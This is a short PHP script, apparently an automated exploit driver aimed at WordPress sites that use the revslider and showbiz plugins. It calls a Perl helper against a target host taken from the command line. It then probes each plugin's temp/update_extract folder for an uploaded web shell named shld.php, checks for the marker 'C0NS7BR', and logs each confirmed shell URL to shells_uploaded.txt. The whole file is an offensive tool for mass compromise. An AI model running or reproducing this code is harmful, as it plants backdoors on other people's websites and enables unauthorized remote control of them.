<?php
/*
Desenvolvido por Matheus Drummond Barbosa
*/
	
	error_reporting(0);
	
	save_shell("");
	system("perl update.pl http://{$_SERVER['argv'][2]} revslider");
	$response = get_response_data("http://{$_SERVER['argv'][2]}/wp-content/plugins/revslider/temp/update_extract/revslider/shld.php");
	if (strstr($response, 'C0NS7BR'))
	save_shell("http://{$_SERVER['argv'][2]}/wp-content/plugins/revslider/temp/update_extract/revslider/shld.php\n");

	system("perl update.pl http://{$_SERVER['argv'][2]} showbiz");
	$response = get_response_data("http://{$_SERVER['argv'][2]}/wp-content/plugins/showbiz/temp/update_extract/showbiz/shld.php");
	if (strstr($response, 'C0NS7BR'))
	save_shell("http://{$_SERVER['argv'][2]}/wp-content/plugins/showbiz/temp/update_extract/showbiz/shld.php\n");
	
	function get_response_data ($url) {
		$result = ""; $ch = curl_init();
		if ($ch) {
			curl_setopt($ch, CURLOPT_URL, $url);
			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_HEADER, 1);
			curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/1.0 (Windows NT 6.1; WOW64; rv:28.0) Gecko/20100101 Firefox/28.0');
			$result = curl_exec($ch);
			curl_close($ch);
		}
		return $result;
	}
	
	function save_shell ($buffer) {
		if (($fp = fopen("shells_uploaded.txt", "a+")) !== false) {
			fwrite($fp, $buffer);
			fclose($fp);
		}
	}
	
?>
